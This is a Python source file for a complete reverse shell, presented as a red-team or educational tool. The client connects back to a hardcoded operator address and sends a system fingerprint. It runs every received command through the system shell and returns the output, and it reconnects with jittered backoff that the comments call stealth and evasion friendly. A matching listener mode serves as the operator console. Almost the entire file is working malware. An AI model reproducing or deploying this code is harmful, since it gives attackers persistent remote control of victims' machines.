#!/usr/bin/env python3
# ======================================================================
# revshell_hardcoded_long_v3.py
# Long, detailed, professional-looking hardcoded reverse shell
# Auto-connect on launch | Stealthy reconnect | Detailed logging
# 
# IMPORTANT: For AUTHORIZED RED TEAM TESTING / EDUCATIONAL PURPOSES ONLY
# EPO - Educational Purposes Only - Do NOT use without written permission
# ======================================================================

import socket
import subprocess
import os
import sys
import time
import random
import datetime
import platform
import getpass
import threading
import signal

# ==================== CONFIGURATION SECTION ====================
# CHANGE THESE VALUES BEFORE USE!
ATTACKER_IP     = "192.168.1.100"          # Your C2 / operator IP
ATTACKER_PORT   = 5555                     # Listening port on operator side

# Reconnect behavior (stealth / evasion friendly)
RECONNECT_BASE_DELAY    = 8                # starting delay in seconds
RECONNECT_MULTIPLIER    = 1.8              # exponential growth factor
RECONNECT_MAX_DELAY     = 600              # never wait longer than 10 minutes
RECONNECT_JITTER_RANGE  = 0.4              # ±40% random variation
MAX_FAILED_ATTEMPTS     = 50               # safety kill-switch after too many fails

# Command execution timeouts & safety
COMMAND_TIMEOUT_SECONDS = 45
SHELL_ENCODING          = 'utf-8', 'replace'

# Beacon identification / fingerprint (sent on first connect)
BEACON_IDENT = {
    "hostname": platform.node(),
    "username": getpass.getuser(),
    "os": f"{platform.system()} {platform.release()}",
    "arch": platform.machine(),
    "python": platform.python_version(),
    "pid": os.getpid()
}

# ============================================================

def current_timestamp():
    """Helper: human-readable timestamp for logs"""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def send_system_info(sock: socket.socket):
    """Send basic system fingerprint on initial connect"""
    info_lines = [f"{k}: {v}" for k, v in BEACON_IDENT.items()]
    info_str = "\n".join(info_lines) + "\n"
    try:
        sock.send(f"[BEACON_INFO]\n{info_str}[/BEACON_INFO]\n".encode(SHELL_ENCODING[0]))
    except:
        pass


def execute_command(cmd: str) -> str:
    """
    Execute received command safely with timeout and proper error reporting
    Supports cd, normal shell commands, basic error catching
    """
    cmd = cmd.strip()
    if not cmd:
        return "[empty command]"

    output = []

    try:
        # Built-in cd handling
        if cmd.lower().startswith("cd "):
            target_dir = cmd[3:].strip()
            try:
                os.chdir(os.path.expanduser(target_dir))
                output.append(f"[+] Current working directory changed to: {os.getcwd()}")
            except FileNotFoundError:
                output.append(f"[error] Directory not found: {target_dir}")
            except PermissionError:
                output.append(f"[error] Permission denied: {target_dir}")
            except Exception as e:
                output.append(f"[cd error] {str(e)}")
            return "\n".join(output)

        # Normal command execution with timeout
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            errors='replace',
            bufsize=1,
            universal_newlines=True
        )

        try:
            stdout, stderr = proc.communicate(timeout=COMMAND_TIMEOUT_SECONDS)
            if stdout:
                output.append(stdout.rstrip())
            if stderr:
                output.append(f"[stderr] {stderr.rstrip()}")
            if proc.returncode != 0:
                output.append(f"[exit code] {proc.returncode}")
        except subprocess.TimeoutExpired:
            proc.kill()
            output.append(f"[TIMEOUT] Command killed after {COMMAND_TIMEOUT_SECONDS} seconds")
        except Exception as e:
            output.append(f"[execution exception] {str(e)}")

        return "\n".join(output) if output else "[no output]"

    except Exception as e:
        return f"[command handler fatal] {str(e)}"


def beacon_connect():
    """Main beacon loop - auto connect-back with smart backoff"""
    print(f"[{current_timestamp()}] Starting persistent beacon → target: {ATTACKER_IP}:{ATTACKER_PORT}")

    attempt_count = 0
    current_delay = RECONNECT_BASE_DELAY

    while attempt_count < MAX_FAILED_ATTEMPTS:
        attempt_count += 1
        try:
            # Create fresh socket each attempt
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)

            print(f"[{current_timestamp()}] Attempt {attempt_count} → connecting...")
            sock.connect((ATTACKER_IP, ATTACKER_PORT))

            print(f"[{current_timestamp()}] SUCCESS - connected to operator!")
            current_delay = RECONNECT_BASE_DELAY  # reset delay
            attempt_count = 0  # reset attempts

            # Send system fingerprint once on successful connection
            send_system_info(sock)

            # Main command loop
            while True:
                try:
                    raw_data = sock.recv(16384)
                    if not raw_data:
                        print(f"[{current_timestamp()}] Connection closed by operator")
                        break

                    command = raw_data.decode(SHELL_ENCODING[0], errors=SHELL_ENCODING[1]).strip()

                    if command.lower() in {'exit', 'quit', 'die', 'terminate'}:
                        sock.send(b"[*] Beacon terminating session as requested\n")
                        break

                    if command:
                        print(f"[{current_timestamp()}] Executing: {command}")
                        result = execute_command(command)
                        sock.send((result + "\n\n").encode(SHELL_ENCODING[0]))

                except socket.timeout:
                    continue  # keep alive
                except (ConnectionResetError, BrokenPipeError, OSError):
                    print(f"[{current_timestamp()}] Operator side disconnected")
                    break

            sock.close()

        except Exception as e:
            error_msg = f"[{current_timestamp()}] Connection failed: {type(e).__name__} - {str(e)}"
            print(error_msg)

            # Calculate next sleep with jitter
            jitter_factor = random.uniform(1 - RECONNECT_JITTER_RANGE, 1 + RECONNECT_JITTER_RANGE)
            sleep_time = current_delay * jitter_factor
            sleep_time = min(sleep_time, RECONNECT_MAX_DELAY)

            print(f"[{current_timestamp()}] Sleeping for {sleep_time:.1f} seconds...")
            time.sleep(sleep_time)

            # Exponential backoff
            current_delay = min(current_delay * RECONNECT_MULTIPLIER, RECONNECT_MAX_DELAY)

    print(f"[{current_timestamp()}] Maximum failed attempts ({MAX_FAILED_ATTEMPTS}) reached. Exiting.")
    sys.exit(1)


def simple_listener():
    """Minimal listener mode - only activated with 'listen' argument"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(("0.0.0.0", ATTACKER_PORT))
        server.listen(2)
        print(f"[{current_timestamp()}] Operator listening on 0.0.0.0:{ATTACKER_PORT}")
    except Exception as e:
        print(f"[{current_timestamp()}] Listener bind failed: {e}")
        sys.exit(1)

    conn, addr = server.accept()
    print(f"[{current_timestamp()}] Connection accepted from {addr[0]}:{addr[1]}")

    try:
        while True:
            cmd = input("shell> ").strip()
            if not cmd:
                continue
            if cmd.lower() in {'exit', 'quit', 'q'}:
                conn.send(b"exit\n")
                break

            conn.send((cmd + "\n").encode())
            try:
                response = conn.recv(32768).decode('utf-8', errors='ignore').rstrip()
                print(f"\n{response}\n")
            except:
                print(f"[{current_timestamp()}] Connection lost")
                break
    finally:
        conn.close()
        server.close()


def signal_handler(sig, frame):
    """Graceful exit on Ctrl+C"""
    print(f"\n[{current_timestamp()}] Received Ctrl+C → shutting down cleanly")
    sys.exit(0)


if __name__ == "__main__":
    # Register signal handler for clean exit
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if len(sys.argv) > 1 and sys.argv[1].lower() in {'listen', 'operator', 'server'}:
        # Optional: run as listener if explicitly requested
        simple_listener()
    else:
        # Default behavior: start auto-connect beacon
        try:
            beacon_connect()
        except KeyboardInterrupt:
            print(f"\n[{current_timestamp()}] Beacon manually stopped")
        except Exception as e:
            print(f"[{current_timestamp()}] Fatal error in beacon: {e}")
            sys.exit(1)